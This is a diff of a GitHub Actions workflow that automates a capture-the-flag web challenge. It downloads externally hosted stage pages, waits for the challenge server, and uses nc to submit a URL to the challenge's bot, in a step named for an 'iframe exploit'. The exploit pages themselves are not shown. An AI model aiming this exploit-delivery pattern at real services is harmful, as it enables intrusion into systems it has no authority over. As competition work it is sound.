@@ -12,25 +12,40 @@ permissions:
 jobs:
   solve:
     runs-on: ubuntu-latest
-    timeout-minutes: 8
+    timeout-minutes: 15
     env:
       START_URL: https://raw.githack.com/karollooool/karollooool/ctf-chronostasis-live-20260814/ctf-live-v2/start.html
     steps:
-      - name: Verify HTML host and live challenge
+      - name: Verify executable HTML host
         shell: bash
         run: |
           set -euxo pipefail
           for i in $(seq 1 24); do
-            if curl -fsS "${START_URL}?probe=${GITHUB_RUN_ID}-${i}" -o start.html && grep -q 'chronostasis start v2' start.html; then
+            if curl -fsS -D start-headers.txt "${START_URL}?probe=${GITHUB_RUN_ID}-${i}" -o start.html && grep -q 'chronostasis start v2' start.html; then
               break
             fi
             sleep 5
           done
           grep -q 'chronostasis start v2' start.html
-          curl -sSI "${START_URL}?probe=${GITHUB_RUN_ID}" | sed -n '1,30p'
+          sed -n '1,30p' start-headers.txt
           curl -fsS "https://raw.githack.com/karollooool/karollooool/ctf-chronostasis-live-20260814/ctf-live-v2/stage.html?probe=${GITHUB_RUN_ID}" -o stage.html
           grep -q 'chronostasis stage v2' stage.html
-          curl -sS -i --max-time 15 http://challenge.rewritelab.org:35465/ | sed -n '1,20p'
+
+      - name: Wait for live access point
+        shell: bash
+        run: |
+          set -uxo pipefail
+          ready=0
+          for i in $(seq 1 120); do
+            if curl -fsS --max-time 5 http://challenge.rewritelab.org:35465/ -o /dev/null; then
+              echo "HTTP access point is up on attempt ${i}"
+              ready=1
+              break
+            fi
+            echo "HTTP access point unavailable; retry ${i}/120"
+            sleep 5
+          done
+          test "${ready}" = 1
 
       - name: Submit intended iframe exploit to live bot
         shell: bash
@@ -38,7 +53,19 @@ jobs:
           set -uxo pipefail
           URL="${START_URL}?run=${GITHUB_RUN_ID}-${GITHUB_RUN_ATTEMPT}"
           echo "Submitting: ${URL}"
-          { printf '%s\n' "${URL}"; sleep 1; } | timeout 50s nc -v challenge.rewritelab.org 35466 2>&1 | tee bot.log || true
+          : > bot.log
+          connected=0
+          for i in $(seq 1 18); do
+            { printf '%s\n' "${URL}"; sleep 1; } | timeout 50s nc -v challenge.rewritelab.org 35466 2>&1 | tee bot-attempt.log || true
+            cat bot-attempt.log >> bot.log
+            if grep -q 'Starting the browser' bot-attempt.log; then
+              connected=1
+              break
+            fi
+            echo "Bot TCP connection did not start a browser; retry ${i}/18" | tee -a bot.log
+            sleep 10
+          done
+          test "${connected}" = 1
           python3 - <<'PY'
           import re
           from pathlib import Path
@@ -57,11 +84,13 @@ jobs:
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: chronostasis-live-v2-${{ github.run_id }}
+          name: chronostasis-live-v2-${{ github.run_id }}-${{ github.run_attempt }}
           path: |
             bot.log
+            bot-attempt.log
             bot-clean.log
             flag.txt
             start.html
             stage.html
+            start-headers.txt
           if-no-files-found: warn
